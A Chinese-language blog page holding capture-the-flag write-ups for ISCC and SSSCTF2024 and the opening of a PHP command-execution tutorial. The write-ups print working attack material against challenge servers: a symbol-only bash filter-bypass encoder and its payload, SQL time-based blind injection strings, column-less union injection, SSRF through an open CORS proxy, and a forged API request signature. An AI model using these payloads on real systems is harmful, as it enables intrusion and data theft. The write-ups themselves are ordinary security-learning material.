<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Dyinglight&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Dyinglight&#39;s blog">
<meta property="og:url" content="http://dyinglight5.github.io/page/2/index.html">
<meta property="og:site_name" content="Dyinglight&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Dyinglight">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Dyinglight's blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Dyinglight&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://dyinglight5.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-ISCC-wp-dyinglight" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/ISCC-wp-dyinglight/" class="article-date">
  <time class="dt-published" datetime="2024-05-01T02:51:02.000Z" itemprop="datePublished">2024-05-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/ISCC-wp-dyinglight/">ISCC-wp-dyinglight</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ISCC-WP-Dyinglight"><a href="#ISCC-WP-Dyinglight" class="headerlink" title="ISCC-WP-Dyinglight"></a>ISCC-WP-Dyinglight</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-还没想好名字的塔防游戏"><a href="#1-还没想好名字的塔防游戏" class="headerlink" title="1.还没想好名字的塔防游戏"></a>1.还没想好名字的塔防游戏</h3><p>hint1:Owls Weave Wisdom</p>
<p>hint2:Goblins Gather Gold </p>
<p>hint3:Elves Echo Eternity</p>
<p>Mystic Defense War: The Secret of Guardian Towers and Magical Monsters</p>
<p>18&#x3D;MDWTSGTMMOWWGGGEEE</p>
<h3 id="2-原神启动"><a href="#2-原神启动" class="headerlink" title="2.原神启动"></a>2.原神启动</h3><p>源代码中的注释，用<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%BE%97%E5%88%B0%E6%B0%B4%E5%85%8B%E5%88%B6%E7%81%AB%EF%BC%8C%E7%81%AB%E5%85%8B%E5%88%B6%E5%86%B0%EF%BC%8C%E5%86%B0%E5%85%8B%E5%88%B6%E9%9B%B7%EF%BC%8C%E9%9B%B7%E5%85%8B%E5%88%B6%E8%8D%89%EF%BC%8C%E8%8D%89%E5%85%8B%E5%88%B6%E6%B0%B4">http://hi.pcmoe.net/index.html解密，得到水克制火，火克制冰，冰克制雷，雷克制草，草克制水</a></p>
<p>输入正确的元素之后，得到success界面，输入flag得知在flag.txt中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;&quot;djkahfakjbnf_32984#@243%&quot;&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/ISCC-wp-dyinglight/" data-id="clyyhqmov000i0ov5dbgehstl" data-title="ISCC-wp-dyinglight" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SSSCTFwp-Dyinglight" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/SSSCTFwp-Dyinglight/" class="article-date">
  <time class="dt-published" datetime="2024-04-27T04:42:33.000Z" itemprop="datePublished">2024-04-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/SSSCTFwp-Dyinglight/">SSSCTFwp-Dyinglight</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SSSCTF2024-wp-Dyinglight"><a href="#SSSCTF2024-wp-Dyinglight" class="headerlink" title="SSSCTF2024 wp -Dyinglight"></a>SSSCTF2024 wp -Dyinglight</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="原神"><a href="#原神" class="headerlink" title="原神"></a>原神</h3><p>flag{yuanshenqidong} 蒙德文字</p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>ida进去就能看到flag</p>
<p><img src="/../images/sssctf/QQ%E6%88%AA%E5%9B%BE20240427091501.png"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-ravenfield"><a href="#1-ravenfield" class="headerlink" title="1.ravenfield"></a>1.ravenfield</h3><p><img src="/../images/sssctf/2.png"></p>
<p>﻿‎下载了个编码的插件，发现utf-8编码会显示you win，但是源代码中间空了很多点点，把这些点点复制到浏览器，发现了这篇文章</p>
<p>﻿‏<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38805084/article/details/102682864">https://blog.csdn.net/qq_38805084/article/details/102682864</a></p>
<p>0‍‍宽字节隐写，﻿<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/%E8%BF%99%E4%B8%AA%E2%80%8C%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8A%8Ayou">https://yuanfux.github.io/zero-width-web/这个‌网站可以解密，把you</a> win复制进来解密即可</p>
<p>﻿‎‍﻿﻿‍﻿‎<img src="/../images/sssctf/3.png">‏‍﻿‌‌‎‍﻿﻿‏‍﻿‎﻿‍﻿﻿‎‏‌‎﻿‍﻿‎﻿‏‏‌‎‍‍﻿‎﻿‎‍‌‌﻿﻿‏﻿﻿‎‏‏‎‎</p>
<p>ps:游戏真好玩)</p>
<h3 id="2-weirdbash-复现"><a href="#2-weirdbash-复现" class="headerlink" title="2.weirdbash(复现)"></a>2.weirdbash(复现)</h3><p>dutctf获得一长串提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*</span><br><span class="line">noob-noob?noob-noob!noob$noob%noob-noob!noob%noob*noob-noob!noob*noob-noob!noob?noob&amp;noob*noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob!noob&amp;noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob-noob!noob&amp;noob!noob&amp;noob!noob-noob!noob?noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob?noob%noob*noob-noob!noob?noob%noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob&amp;noob*noob-noob!noob*noob-noob!noob?noob-noob!noob?noob%noob-noob!noob?noob%noob*noob-noob!noob?noob&amp;noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob-noob!noob$noob%noob-noob!noob*noob-noob!noob%noob&amp;noob*noob!noob$noob%noob&amp;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+-!? $%&amp;* 是标准顺序1111 1111</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">noob_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    encodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_string:</span><br><span class="line">        ascii_value = <span class="built_in">ord</span>(char)</span><br><span class="line">        binary_representation = <span class="string">&#x27;&#123;0:08b&#125;&#x27;</span>.<span class="built_in">format</span>(ascii_value)</span><br><span class="line">        encodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> bit, operator <span class="keyword">in</span> <span class="built_in">zip</span>(binary_representation, [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]):</span><br><span class="line">            <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                encodeed_char += operator</span><br><span class="line">        encodeed_string += encodeed_char</span><br><span class="line">    <span class="keyword">return</span> encodeed_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">noob_decode</span>(<span class="params">encodeed_string</span>):</span><br><span class="line">    decodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encodeed_string):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            check_valid_noob_string(encodeed_string[i:])</span><br><span class="line">            decodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> operator <span class="keyword">in</span> [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]:</span><br><span class="line">                <span class="keyword">if</span> encodeed_string.startswith(operator, i):</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    i += <span class="built_in">len</span>(operator)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            ascii_value = <span class="built_in">int</span>(decodeed_char, <span class="number">2</span>)  <span class="comment"># 转换为2进制</span></span><br><span class="line">            decodeed_string += <span class="built_in">chr</span>(ascii_value)</span><br><span class="line">        <span class="keyword">except</span> DecodeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> DecodeError</span><br><span class="line">    <span class="keyword">return</span> decodeed_string</span><br></pre></td></tr></table></figure>

<p>根据完整的加解密代码，逻辑是先把字符串ascii转化为八位二进制(例如0000 0000)，然后分别用<code>&#39;noob+&#39;, &#39;noob-&#39;, &#39;noob!&#39;, &#39;noob?&#39;, &#39;noob$&#39;, &#39;noob%&#39;, &#39;noob&amp;&#39;, &#39;noob*&#39;</code>去替换这八个数字中的1，得到加密的字符串</p>
<p>解密的逻辑就是把noob串遍历，有对应的字符就加1，没有就加0，得到二进制串，再翻译为ascii码即可</p>
<p>解密后的结果为：Please go to the “&#x2F;noob” route to capture the flag.</p>
<p>进入&#x2F;noob路由，经过测试过滤了所有的字母数字，还有&amp;,&#x3D;,~,_</p>
<p><img src="/../images/sssctf/bash%E8%BF%87%E6%BB%A4.PNG"></p>
<p>自己做题的时候一直在用异或绕过的方向，但是命令似乎并不会被解析</p>
<p>利用脚本绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> cmdx <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>((<span class="built_in">oct</span>(<span class="built_in">ord</span>(cmdx)))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span></span><br><span class="line">    ct = <span class="built_in">str</span>.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ct = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + ct + <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    charset = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> ctx <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> ctx.isprintable() <span class="keyword">and</span> ctx <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            charset.add(ctx)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc(<span class="string">&quot;cat /flag&quot;</span>))</span><br></pre></td></tr></table></figure>

<p><code>$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\&lt;\&lt;\&lt;\$\&#39;\\$(($(($&lt;&lt;$))#$$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$))\&#39;</code></p>
<p>加密成noob再执行即可(多等会儿)</p>
<p>本质上是利用$#进行构造，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EH4iuPNbmxG=DuYD&alichlgref=https://cn.bing.com/#toc-0">参考文章</a></p>
<h3 id="3-app-没做出来"><a href="#3-app-没做出来" class="headerlink" title="3.app(没做出来)"></a>3.app(没做出来)</h3><p>扫描到config：{“key”:”quOKHlGWut9iJUFvDi0CoKwqN1dw0z4zsul5IGdvvpc&#x3D;”,”iv”:”nsmz&#x2F;N5vMhnUaF&#x2F;hSvAP8w&#x3D;&#x3D;”}</p>
<p>gallery:[{“id”:1,”url”:”&#x2F;img&#x2F;1.jpg”},{“id”:2,”url”:”&#x2F;img&#x2F;2.jpg”},{“id”:3,”url”:”&#x2F;img&#x2F;3.png”}]</p>
<h3 id="4-gpt-复现"><a href="#4-gpt-复现" class="headerlink" title="4.gpt(复现)"></a>4.gpt(复现)</h3><p>首先是sql时间盲注入，<code>username=1&amp;password=1&#39;+||+if(ascii(substr(database(),1))=115,sleep(2),1)%23</code></p>
<p>注出数据库名为sssctf2024_db</p>
<p>由于or被ban了，用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">schema_auto_increment_columns#该视图的作用简单来说就是用来对表自增ID的监控,可以通过该视图获取数据库的表名信息。</span><br><span class="line">schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer<span class="operator">/</span><span class="operator">/</span>没有自增数据</span><br><span class="line">mysql.innodb_table_stats、mysql.innodb_table_index</span><br></pre></td></tr></table></figure>

<p>可以替换information_schema，得到表名<code>sssctf2024_users</code>(这些表没有列名)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=&#x27;</span>sssctf2024_db<span class="string">&#x27; limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>

<p>查列名，可以使用无列名注入</p>
<p><code>select 1,2,3  union select * from sssctf2024_users</code>会产生一个虚拟表(必须保证列数正确)</p>
<p>只要给虚拟表取一个别名n，即可查询其中的数据，下面查询了第二列的数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 反引号<span class="number">2</span>反引号 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>

<p>在反引号被过滤时还可以使用给列起别名的方式查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>

<p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>

<p>故可以用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select n.2 from (select 1,2,3 union select * from sssctf2024_users)n limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>

<p>查到列名为username,password，注出数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select username from sssctf2024_db.sssctf2024_users limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scr1w_admin,sssctf2024_P@ssvv0rd</span><br></pre></td></tr></table></figure>

<p>登陆进去发现</p>
<p><img src="/../images/sssctf/gpt.png"></p>
<p>flag生成的是假的，next-gpt能搜索到一个ssrf漏洞</p>
<p>但是，有一些暴露的服务器端点。其中一个端点位于&#x2F;API&#x2F;cors，它的功能设计为开放代理，允许未经身份验证的用户通过它发送任意HTTP请求。添加此端点似乎是为了支持将客户端聊天数据保存到WebDAV服务器。此端点的存在是一种反模式：它允许客户端绕过内置的浏览器保护，通过服务器端端点访问跨域资源。</p>
<p>于是访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator%E5%8D%B3%E5%8F%AF%E6%8B%BF%E5%88%B0%E7%9C%9F%E6%AD%A3%E7%9A%84flag">http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator即可拿到真正的flag</a></p>
<h3 id="5-app"><a href="#5-app" class="headerlink" title="5.app"></a>5.app</h3><p><img src="/../images/sssctf/app-1.png"></p>
<p>360加固，用frida-dexdump脱壳</p>
<p>前台模拟器挂着app，开启adb中的frida</p>
<p><img src="/../images/sssctf/7.png" alt="!(../images/sssctf/6.png)"></p>
<p><img src="/../images/sssctf/8.png"></p>
<p>生成了一个文件夹，把里面的dex文件拖入jadx</p>
<p><img src="/../images/sssctf/9.png"></p>
<p>再用fiddler抓包,抓到config的包</p>
<p><img src="/../images/sssctf/10.png"></p>
<p>{“key”:”khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk&#x3D;”,”iv”:”bhT3FXFaimOl80uvAk92+A&#x3D;&#x3D;”}</p>
<p><img src="/../images/sssctf/11.png"></p>
<p>点击个人信息抓到这个包，直接访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10055/service/m/app/info?uid=-1">http://210.30.97.133:10055/service/m/app/info?uid=-1</a></p>
<p><img src="/../images/sssctf/12.png"></p>
<p>得知访问数据是要签名的，签名需要config里的key和iv，用java签名的AES加密，发包</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk=&quot;</span>; <span class="comment">// 替换为你的key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="string">&quot;bhT3FXFaimOl80uvAk92+A==&quot;</span>; <span class="comment">// 替换为你的iv</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;uid=20&amp;timestamp=1&amp;a=2&amp;nonce=3&quot;</span>; <span class="comment">// 替换为你的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Base64.getDecoder().decode(key), <span class="string">&quot;AES&quot;</span>), <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(Base64.getDecoder().decode(iv)));</span><br><span class="line">        <span class="type">byte</span>[] encrypted = cipher.doFinal(data.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest(encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sign</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;Generated sign: &quot;</span> + sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sssctf/14.png"></p>
<p>做到这里发现uid是无法直接访问其他数据的，看了wp上通过逆向分析可以发现rank路由</p>
<p><img src="/../images/sssctf/15.png"></p>
<p>拿到数据，发现最后一条数据<code>&#123;&quot;id&quot;:6660,&quot;institute&quot;:&quot;DUTCTF&quot;,&quot;name&quot;:&quot;福来阁&quot;,&quot;points&quot;:40&#125;</code></p>
<p>这里可以猜测是visitor的问题，根据逆向的代码(这里直接贴wp的图片了，自己太菜审计不出来)，得知有个isVisitor参数</p>
<p><img src="/../images/sssctf/16.png"></p>
<p>构造url访问，记得这里的签名也要加上isVisitor</p>
<p><img src="/../images/sssctf/17.png"></p>
<p>千辛万苦终于拿到flag了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/SSSCTFwp-Dyinglight/" data-id="clyyhqmou000c0ov56bz89iqf" data-title="SSSCTFwp-Dyinglight" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-php命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="dt-published" datetime="2024-04-17T08:03:29.000Z" itemprop="datePublished">2024-04-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">php命令执行</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h2 id="一-命令执行函数介绍"><a href="#一-命令执行函数介绍" class="headerlink" title="一.命令执行函数介绍"></a>一.命令执行函数介绍</h2><p><code>system exec passthru shell_exec 反引号 popen proc_open pcntl_exec</code></p>
<p>了解能否<strong>回显</strong>，需求的<strong>参数</strong></p>
<h3 id="system-string-command-int-return-var"><a href="#system-string-command-int-return-var" class="headerlink" title="system(string $command,int &amp;$return_var&#x3D;?)"></a>system(string $command,int &amp;$return_var&#x3D;?)</h3><p>command为执行的命令(必须)，return_var用来记录命令执行后返回的状态(可选)</p>
<p><strong>system函数有回显</strong></p>
<h3 id="exec-string-command-array-output-int-return-var"><a href="#exec-string-command-array-output-int-return-var" class="headerlink" title="exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)"></a>exec(string $command,array &amp;$output&#x3D;?,int  &amp;$return_var&#x3D;?)</h3><p>command为执行的命令，单独使用时只有最后一行结果，且不会回显</p>
<p>output:用命令执行的输出填充此数组，每行输出一个元素，用<strong>print_r(array)或var_dump</strong>输出结果</p>
